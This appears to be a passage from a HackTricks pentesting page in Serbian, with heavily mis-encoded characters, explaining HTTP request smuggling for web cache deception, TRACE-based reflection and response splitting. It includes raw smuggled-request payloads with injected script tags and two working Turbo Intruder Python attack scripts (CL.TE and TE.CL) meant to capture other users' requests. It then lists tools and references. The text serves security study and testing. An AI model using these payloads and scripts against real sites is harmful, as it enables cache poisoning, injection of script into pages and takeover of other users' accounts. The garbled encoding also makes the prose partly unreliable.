### KoriÅ¡Ä‡enje HTTP zahteva za krijumÄarenje kako bi se izveo prevarantni veb keÅ¡ <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Koja je razlika izmeÄ‘u trovanja veb keÅ¡a i prevarantnog veb keÅ¡a?**
>
> * U **trovanju veb keÅ¡a**, napadaÄ uzrokuje da aplikacija saÄuva zlonamerni sadrÅ¾aj u keÅ¡u, a ovaj sadrÅ¾aj se posluÅ¾uje iz keÅ¡a drugim korisnicima aplikacije.
> * U **prevarantnom veb keÅ¡u**, napadaÄ uzrokuje da aplikacija saÄuva neki osetljivi sadrÅ¾aj koji pripada drugom korisniku u keÅ¡u, a zatim napadaÄ preuzima taj sadrÅ¾aj iz keÅ¡a.

NapadaÄ kreira krijumÄareni zahtev koji dohvata osetljiv korisniÄki specifiÄan sadrÅ¾aj. Razmotrite sledeÄ‡i primer:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Ako ovaj krijumÄareni zahtev otrovi keÅ¡ zapis namenjen statiÄkom sadrÅ¾aju (npr. `/someimage.png`), osetljivi podaci Å¾rtve iz `/private/messages` mogu biti keÅ¡irani pod keÅ¡ zapisom statiÄkog sadrÅ¾aja. Kao rezultat toga, napadaÄ bi potencijalno mogao povratiti ove keÅ¡irane osetljive podatke.

### Zloupotreba TRACE putem HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**U ovom postu**](https://portswigger.net/research/trace-desync-attack) se sugeriÅ¡e da ukoliko je server omoguÄ‡io metodu TRACE, moguÄ‡e je zloupotrebiti je sa HTTP Request Smuggling-om. Ovo je zato Å¡to Ä‡e ova metoda odraÅ¾avati bilo koji zaglavlje poslato serveru kao deo tela odgovora. Na primer:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
PoslaÄ‡e odgovor poput:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Jedan primer kako zloupotrebiti ovu ponaÅ¡anje bilo bi **prvo prokrijumÄariti HEAD zahtev**. Ovaj zahtev Ä‡e dobiti odgovor samo sa **zaglavljima** GET zahteva (**`Content-Type`** meÄ‘u njima). Zatim prokrijumÄariti **odmah nakon HEAD zahteva TRACE zahtev**, koji Ä‡e **reflektovati poslate podatke**.\
PoÅ¡to Ä‡e odgovor HEAD zahteva sadrÅ¾ati zaglavlje `Content-Length`, **odgovor TRACE zahteva Ä‡e biti tretiran kao telo odgovora HEAD zahteva, te Ä‡e reflektovati proizvoljne podatke** u odgovoru. \
Ovaj odgovor Ä‡e biti poslat sledeÄ‡em zahtevu preko veze, pa bi ovo moglo biti **koriÅ¡Ä‡eno u keÅ¡iranom JS fajlu na primer za ubacivanje proizvoljnog JS koda**.

### Zloupotreba TRACE putem Razdvajanja HTTP Odgovora <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Nastavite pratiti [**ovaj post**](https://portswigger.net/research/trace-desync-attack) predloÅ¾en je joÅ¡ jedan naÄin zloupotrebe metode TRACE. Kao Å¡to je komentarisano, prokrijumÄariti HEAD zahtev i TRACE zahtev je moguÄ‡e **kontrolisati neke reflektovane podatke** u odgovoru na HEAD zahtev. DuÅ¾ina tela HEAD zahteva je uglavnom naznaÄena u zaglavlju Content-Length i formirana je odgovorom na TRACE zahtev.

Stoga, nova ideja bi bila da, znajuÄ‡i ovaj Content-Length i podatke dati u TRACE odgovoru, moguÄ‡e je napraviti da TRACE odgovor sadrÅ¾i validan HTTP odgovor nakon poslednjeg bajta Content-Length, omoguÄ‡avajuÄ‡i napadaÄu potpunu kontrolu nad zahtevom ka sledeÄ‡em odgovoru (Å¡to bi moglo biti koriÅ¡Ä‡eno za izvoÄ‘enje trovanja keÅ¡a).

Primer:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Ä†e generisati ove odgovore (obratite paÅ¾nju kako HEAD odgovor ima Content-Length ÄineÄ‡i TRACE odgovor deo HEAD tela i kada HEAD Content-Length zavrÅ¡i, validan HTTP odgovor je prokrijumÄaren):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(â€œarbitrary responseâ€)</script>
```
### OruÅ¾jeziranje HTTP zahteva za krijumÄarenje sa dezinkronizacijom HTTP odgovora

Da li ste pronaÅ¡li neku ranjivost u vezi sa krijumÄarenjem HTTP zahteva i ne znate kako da je iskoristite. PokuÅ¡ajte sa ovom drugom metodom iskoriÅ¡Ä‡avanja:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### Druge tehnike krijumÄarenja HTTP zahteva

* Klijentsko krijumÄarenje HTTP zahteva pretraÅ¾ivaÄa (sa klijentske strane)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* KrijumÄarenje zahteva u HTTP/2 spuÅ¡tanju

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Turbo intruder skripte

### CL.TE

Sa [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Od: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Alati

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Ovaj alat je fuzzer za HTTP zasnovan na gramatici koristan za pronalaÅ¾enje Äudnih razlika u zahtevima za Å¡vercovanje.

## Reference

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
